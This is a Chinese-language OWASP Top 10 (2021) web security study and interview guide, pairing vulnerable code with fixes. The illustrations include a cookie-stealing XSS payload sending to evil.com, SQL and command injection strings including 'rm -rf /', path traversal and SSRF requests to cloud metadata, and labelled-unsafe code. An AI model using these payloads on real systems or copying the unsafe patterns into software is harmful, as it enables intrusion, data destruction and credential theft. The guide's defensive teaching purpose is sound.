# OWASP Top 10 与 Web 安全

---

## 1. OWASP Top 10 (2021) 完整解读？

**回答：**

```
OWASP = Open Web Application Security Project
Top 10 = 最关键的 Web 应用安全风险

2021 版排名:
  A01: 失效的访问控制 (Broken Access Control)        ↑ 从第5升至第1
  A02: 加密机制失效 (Cryptographic Failures)          ↑ 原"敏感数据暴露"
  A03: 注入 (Injection)                               ↓ 从第1降至第3
  A04: 不安全设计 (Insecure Design)                   ★ 新增
  A05: 安全配置错误 (Security Misconfiguration)       ↑
  A06: 脆弱和过时的组件 (Vulnerable Components)       ↑
  A07: 身份验证和认证失效 (Auth Failures)              ↓
  A08: 软件和数据完整性失败 (Integrity Failures)       ★ 新增
  A09: 安全日志和监控失效 (Logging Failures)           ↑
  A10: 服务器端请求伪造 (SSRF)                        ★ 新增
```

---

## 2. A01 - 失效的访问控制？

**回答：**

```
问题: 用户能执行其权限之外的操作

常见漏洞:
  IDOR (不安全的直接对象引用):
    GET /api/users/123/profile    ← 修改 ID 即可看别人数据
    GET /api/users/456/profile    ← 未校验当前用户是否有权访问

  越权:
    水平越权: 普通用户 A 访问用户 B 的数据
    垂直越权: 普通用户执行管理员操作

  路径遍历:
    GET /api/files?path=../../etc/passwd

防护措施:
```

```python
# ❌ 不安全: 直接使用用户输入的 ID
@app.route('/api/orders/<order_id>')
def get_order(order_id):
    return db.query(f"SELECT * FROM orders WHERE id = {order_id}")

# ✅ 安全: 验证资源归属
@app.route('/api/orders/<int:order_id>')
def get_order(order_id):
    current_user = get_current_user()
    order = Order.query.get_or_404(order_id)
    if order.user_id != current_user.id:
        abort(403)
    return jsonify(order.to_dict())
```

```
防护清单:
  ✅ 默认拒绝 (deny by default)
  ✅ 服务端校验权限 (不能只靠前端)
  ✅ RBAC / ABAC 权限模型
  ✅ 资源归属校验 (owner check)
  ✅ API Rate Limiting
  ✅ JWT 严格校验 (算法、过期、签名)
  ✅ 日志记录所有访问控制失败
```

---

## 3. A03 - 注入攻击详解？

**回答：**

```
注入类型:
  ┌─────────────┬──────────────────────────────────────┐
  │ 类型         │ 说明                                  │
  ├─────────────┼──────────────────────────────────────┤
  │ SQL 注入     │ 恶意 SQL 语句                         │
  │ XSS         │ 恶意 JavaScript 注入                   │
  │ 命令注入     │ OS 命令注入                            │
  │ LDAP 注入   │ LDAP 查询注入                          │
  │ NoSQL 注入  │ MongoDB 查询注入                       │
  │ 模板注入     │ 服务端模板引擎注入 (SSTI)               │
  │ CRLF 注入   │ HTTP 头部注入                          │
  └─────────────┴──────────────────────────────────────┘
```

### SQL 注入

```python
# ❌ 字符串拼接 → SQL 注入
query = f"SELECT * FROM users WHERE name = '{username}'"
# username = "'; DROP TABLE users; --"  → 删表

# ✅ 参数化查询
cursor.execute("SELECT * FROM users WHERE name = %s", (username,))

# ✅ ORM
user = User.query.filter_by(name=username).first()
```

### XSS (跨站脚本)

```
三种类型:
  反射型 XSS: 恶意输入通过 URL 参数反射到页面
    https://site.com/search?q=<script>alert('XSS')</script>

  存储型 XSS: 恶意脚本存入数据库, 其他用户访问时执行
    评论内容: <script>document.location='https://evil.com?c='+document.cookie</script>

  DOM 型 XSS: 前端 JavaScript 直接操作 DOM 导致

防护:
  ✅ 输出转义 (HTML Entity Encoding)
  ✅ Content-Security-Policy (CSP) 头
  ✅ HttpOnly Cookie (防止 JS 读取)
  ✅ 前端框架自动转义 (React, Vue)
```

```
Content-Security-Policy 示例:
  Content-Security-Policy: default-src 'self';
    script-src 'self' https://cdn.example.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data:;
    connect-src 'self' https://api.example.com;
```

### 命令注入

```python
# ❌ 直接拼接命令
import os
os.system(f"ping {user_input}")
# user_input = "8.8.8.8; rm -rf /"  → 执行危险命令

# ✅ 使用安全的 API
import subprocess
subprocess.run(["ping", "-c", "4", user_input], check=True)
# user_input 作为单个参数, 不会被 shell 解析
```

---

## 4. A02 - 加密机制失效？

**回答：**

```
常见问题:
  ❌ 明文传输敏感数据 (HTTP 而非 HTTPS)
  ❌ 使用弱加密算法 (MD5, SHA1, DES)
  ❌ 密码以明文或简单哈希存储
  ❌ 硬编码加密密钥
  ❌ 使用自创加密算法

正确做法:
  传输层:
    ✅ 全站 HTTPS (HSTS)
    ✅ TLS 1.2+ (禁用 SSL, TLS 1.0/1.1)
    ✅ 强密码套件

  存储层:
    ✅ 密码: bcrypt / scrypt / Argon2 (带盐)
    ✅ 对称加密: AES-256-GCM
    ✅ 非对称加密: RSA-2048+ / ECDSA
    ✅ 哈希: SHA-256+
    ✅ 密钥管理: Vault / KMS (不在代码中)

  数据分类:
    ┌──────────────┬─────────────────────────┐
    │ 数据类型      │ 保护方式                 │
    ├──────────────┼─────────────────────────┤
    │ 密码         │ bcrypt (不可逆哈希)       │
    │ 信用卡号     │ AES 加密 + PCI DSS 合规  │
    │ 个人信息     │ AES 加密 + 访问控制       │
    │ API 密钥     │ Vault / KMS              │
    │ Session      │ 安全随机生成 + HttpOnly   │
    └──────────────┴─────────────────────────┘
```

```python
# 密码存储示例
import bcrypt

# 注册: 哈希密码
password = "user_password".encode('utf-8')
salt = bcrypt.gensalt(rounds=12)
hashed = bcrypt.hashpw(password, salt)

# 登录: 验证密码
if bcrypt.checkpw(input_password.encode('utf-8'), stored_hash):
    print("Login success")
```

---

## 5. A04 - 不安全设计 vs A05 - 安全配置错误？

**回答：**

```
A04 不安全设计 (设计层面的缺陷):
  问题: 架构/设计本身就有漏洞, 靠实现无法修复
  
  例子:
    没有限制密码重试次数 → 暴力破解
    没有设计多因素认证 → 凭证泄漏即失守
    API 返回过多数据 → 信息泄露
    没有威胁建模 → 遗漏攻击向量

  防护:
    ✅ 安全需求分析 (开发前)
    ✅ 威胁建模 (STRIDE)
    ✅ 安全设计审查
    ✅ 安全用例 / 滥用用例
    ✅ 安全架构模式

A05 安全配置错误 (配置层面的问题):
  问题: 设计没问题, 但配置/部署不当

  例子:
    默认密码未修改
    调试页面开启 (Django DEBUG=True)
    不必要的端口/服务开启
    目录列表开启
    错误信息暴露栈信息
    CORS 配置 * 允许所有

  防护:
    ✅ 安全基线 (CIS Benchmark)
    ✅ 最小化安装
    ✅ 自动化配置扫描
    ✅ 定期审查配置
```

---

## 6. A10 - SSRF 服务器端请求伪造？

**回答：**

```
SSRF: 攻击者让服务器发起意外的请求

攻击场景:
  用户提交 URL → 服务器去访问 → 访问到内部资源

  1. 请求:
     POST /api/fetch-url
     {"url": "http://169.254.169.254/latest/meta-data/"}
     → 获取 AWS 元数据中的临时凭证

  2. 请求:
     {"url": "http://10.0.0.1:6379/"}
     → 访问内部 Redis

  3. 请求:
     {"url": "file:///etc/passwd"}
     → 读取本地文件

真实案例:
  Capital One 2019 数据泄露
  攻击路径: WAF 漏洞 → SSRF → EC2 Meta-Data → AWS 凭证 → S3 数据
```

```python
# ❌ 不安全: 直接请求用户提供的 URL
import requests
def fetch(url):
    return requests.get(url).text

# ✅ 安全: 白名单 + 验证
import ipaddress
from urllib.parse import urlparse

ALLOWED_HOSTS = {"api.example.com", "cdn.example.com"}

def safe_fetch(url):
    parsed = urlparse(url)
    
    # 只允许 http/https
    if parsed.scheme not in ('http', 'https'):
        raise ValueError("Invalid scheme")
    
    # 白名单域名
    if parsed.hostname not in ALLOWED_HOSTS:
        raise ValueError("Host not allowed")
    
    # 禁止内网 IP
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            raise ValueError("Private IP not allowed")
    except ValueError:
        pass  # 是域名, 不是 IP
    
    return requests.get(url, timeout=5).text
```

```
防护措施:
  ✅ 白名单 (允许的域名/IP)
  ✅ 禁止请求私有 IP (10.x, 172.16.x, 192.168.x, 169.254.x)
  ✅ 禁止非 HTTP(S) 协议 (file://, ftp://, gopher://)
  ✅ 使用 IMDS v2 (AWS 元数据服务防 SSRF)
  ✅ 网络隔离 (应用层无法直连元数据服务)
```

---

## 7. CSRF 跨站请求伪造？

**回答：**

```
CSRF: 诱导已登录用户在不知情的情况下发起请求

攻击流程:
  1. 用户登录 bank.com (有 Cookie)
  2. 用户访问恶意网站 evil.com
  3. evil.com 页面包含:
     <img src="https://bank.com/transfer?to=attacker&amount=10000">
  4. 浏览器自动带上 bank.com 的 Cookie
  5. 转账请求成功

防护:
  1. CSRF Token:
     服务端生成随机 Token → 嵌入表单
     提交时验证 Token → 攻击者无法获取 Token
  
  2. SameSite Cookie:
     Set-Cookie: session=xxx; SameSite=Strict
     Strict: 跨站请求不发 Cookie
     Lax:    GET 可以, POST 不行 (默认值)
     None:   都发 (需要 Secure)
  
  3. Referer / Origin 检查:
     验证请求来源域名

  4. 双重 Cookie:
     Cookie 中存 Token + 请求头/参数也带 Token
```

---

## 8. 安全 HTTP 头部？

**回答：**

```
必备安全头:

  Strict-Transport-Security: max-age=31536000; includeSubDomains
  → HSTS: 强制 HTTPS, 防止降级攻击

  Content-Security-Policy: default-src 'self'; script-src 'self'
  → CSP: 控制资源加载来源, 防止 XSS

  X-Content-Type-Options: nosniff
  → 禁止 MIME 类型嗅探

  X-Frame-Options: DENY
  → 禁止页面被 iframe 嵌入, 防止点击劫持

  X-XSS-Protection: 0
  → 现代浏览器建议禁用 (用 CSP 替代)

  Referrer-Policy: strict-origin-when-cross-origin
  → 控制 Referer 头信息泄露

  Permissions-Policy: camera=(), microphone=(), geolocation=()
  → 禁用不需要的浏览器功能

  Cache-Control: no-store
  → 敏感页面禁止缓存
```

```nginx
# Nginx 配置安全头
server {
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self'" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "DENY" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
}
```

---

## 9. API 安全？

**回答：**

```
API 安全要点:
  ┌────────────────┬─────────────────────────────────┐
  │ 层面            │ 措施                             │
  ├────────────────┼─────────────────────────────────┤
  │ 认证           │ OAuth 2.0 / JWT / API Key        │
  │ 授权           │ RBAC / ABAC / Scope              │
  │ 传输           │ HTTPS + TLS 1.2+                 │
  │ 输入验证       │ Schema 校验 (JSON Schema)         │
  │ 限流           │ Rate Limiting (429)               │
  │ 日志           │ 记录所有 API 调用                  │
  │ 版本           │ URL 或 Header 版本控制             │
  │ 文档           │ 不暴露内部 API 文档                │
  └────────────────┴─────────────────────────────────┘

JWT 安全:
  ❌ 不要用 alg: none
  ❌ 不要在 JWT 中存敏感数据 (payload 是 Base64, 不是加密)
  ✅ 验证签名算法 (防止算法混淆攻击)
  ✅ 设置短过期时间 + Refresh Token
  ✅ 使用 RS256 (非对称) > HS256 (对称)
```

```python
# API Rate Limiting 示例 (Flask)
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["100 per minute"]
)

@app.route('/api/data')
@limiter.limit("10 per second")
def get_data():
    return jsonify(data)
```

```
OWASP API Security Top 10 (2023):
  API1: 失效的对象级授权 (BOLA)
  API2: 失效的认证
  API3: 失效的对象属性级授权
  API4: 不受限制的资源消耗
  API5: 失效的功能级授权
  API6: 服务器端请求伪造
  API7: 安全配置错误
  API8: 缺乏对自动化威胁的防护
  API9: 资产管理不当
  API10: API 的不安全使用
```

---

## 10. Web 安全面试速答？

**回答：**

```
Q: OWASP Top 10 第一名是什么?
A: 失效的访问控制 (2021版), 包括 IDOR、越权、路径遍历
   防护: 默认拒绝 + RBAC + 资源归属校验

Q: SQL 注入怎么防?
A: 参数化查询 (Prepared Statement) / ORM
   不要字符串拼接 SQL, WAF 作为补充

Q: XSS 怎么防?
A: 输出转义 + CSP + HttpOnly Cookie + 前端框架自动转义
   三种: 反射型(URL)、存储型(DB)、DOM型(JS)

Q: CSRF 怎么防?
A: CSRF Token + SameSite Cookie (Lax/Strict)
   + Referer/Origin 校验

Q: SSRF 怎么防?
A: 白名单域名/IP + 禁止私有IP + 禁止非HTTP协议
   + AWS IMDS v2 + 网络隔离

Q: HTTPS 和 HTTP 的区别?
A: HTTPS = HTTP + TLS 加密
   防窃听(加密) + 防篡改(完整性) + 防冒充(证书)
   TLS 握手: ClientHello → ServerHello → 证书 → 密钥交换

Q: JWT 有什么安全问题?
A: alg:none 绕过、算法混淆、payload 非加密(Base64)
   防护: 校验算法 + 短过期 + RS256 + 不存敏感数据

Q: 密码怎么存储?
A: bcrypt / Argon2 + 盐值, 绝不用 MD5/SHA1
   bcrypt 自带盐 + 可调 cost factor

Q: 什么是 CSP?
A: Content-Security-Policy, 控制页面可加载资源的来源
   防止 XSS (限制 script-src)、数据窃取 (限制 connect-src)
```
